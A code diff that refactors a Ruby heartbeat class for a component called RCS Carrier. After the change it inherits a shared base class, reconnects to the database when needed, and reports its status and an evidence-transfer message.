@@ -1,46 +1,41 @@
-#
-#  Heartbeat to update the status of the component in the db
-#
-
-# from RCS::Common
 require 'rcs-common/trace'
 require 'rcs-common/systemstatus'
+require 'rcs-common/heartbeat'
 
 module RCS
-module Carrier
+  module Carrier
+    class HeartBeat < RCS::HeartBeat::Base
+      component :carrier
 
-class HeartBeat
-  extend RCS::Tracer
+      before_heartbeat do
+        # if the database connection has gone
+        # try to re-login to the database again
+        unless DB.instance.connected?
+          trace :debug, "heartbeat: try to reconnecto to rcs-db"
+          DB.instance.connect!(:carrier)
+        end
 
-  def self.perform
-    # if the database connection has gone
-    # try to re-login to the database again
-    DB.instance.connect!(:carrier) if not DB.instance.connected?
+        # still no luck ?  return and wait for the next iteration
+        !!DB.instance.connected?
+      end
 
-    # still no luck ?  return and wait for the next iteration
-    return unless DB.instance.connected?
+      after_heartbeat do
+        EvidenceTransfer.instance.status = nil
+      end
 
-    # report our status to the db
-    component = "RCS::Carrier"
+      def status
+        EvidenceTransfer.instance.status ? 'ERROR' : super
+      end
 
-    # if we are transferring evidences, report it accordingly
-    # the thread count of 2 is the eventmachine reactor + the main thread
-    # all the rest are spawned to transfer evidence
-    message = EvidenceTransfer.instance.threads > 0 ? "Transferring evidence for #{EvidenceTransfer.instance.threads} instances" : "Idle..."
-
-    # report our status
-    status = SystemStatus.my_status
-    disk = SystemStatus.disk_free
-    cpu = SystemStatus.cpu_load
-    pcpu = SystemStatus.my_cpu_load(component)
-
-    # create the stats hash
-    stats = {:disk => disk, :cpu => cpu, :pcpu => pcpu}
-
-    # send the status to the db
-    DB.instance.update_status component, '', status, message, stats, 'carrier', $version
+      def message
+        if EvidenceTransfer.instance.status
+          EvidenceTransfer.instance.status
+        elsif EvidenceTransfer.instance.threads > 0
+          "Transferring evidence for #{EvidenceTransfer.instance.threads} instances"
+        else
+          "Idle"
+        end
+      end
+    end
   end
 end
-
-end #Collector::
-end #RCS::
